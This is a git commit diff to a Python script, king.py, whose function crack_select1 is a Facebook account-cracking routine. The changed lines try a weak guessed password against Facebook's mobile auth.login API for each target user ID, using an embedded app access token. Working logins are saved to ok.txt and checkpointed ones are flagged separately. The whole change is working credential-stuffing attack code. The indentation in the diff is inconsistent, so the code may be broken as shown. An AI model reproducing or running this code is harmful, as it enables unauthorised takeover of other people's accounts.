f48a96d263b958d26839f01a2c1e74fc1fb7028a
MY REAL NAME IS INVISIBLE <93032268+Eniolahacking@users.noreply.github.com>
2021-12-03 18:28:40 +0100

    Update king.py

--- king.py
+++ king.py
@@ -1183,16 +1183,16 @@ def crack_select1():
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
 																	cps.append(uid+pass7)
-														        else:
-																	pass8 = name.lower().split(' ')[0] + '123456'
-																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-																	q = json.loads(data)
-																	if "access_token" in q and "EAAA" in q:
-																		print(" \033[1;32m [@efk-OK] "+uid+" | "+pass8+"\033[0;97m")
-																		ok = open("ok.txt", "a")
-																		ok.write(uid+"|"+pass8+"\n")
-																		ok.close()
-																		oks.append(uid+pass8)
+													    else:
+															pass8 = "334455"
+															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
+															q = json.loads(data)
+															if "access_token" in q and "EAAA" in q:
+																print(" \033[1;32m [@efk-OK] "+uid+" | "+pass8+"\033[0;97m")
+																ok = open("ok.txt", "a")
+																ok.write(uid+"|"+pass8+"\n")
+																ok.close()
+																oks.append(uid+pass8)
 																	else:
 																	    if "www.facebook.com" in q["error_msg"]:
 																			print(" \033[1;33m [@efk-CP] "+uid+" | "+pass8+"\033[0;97m")
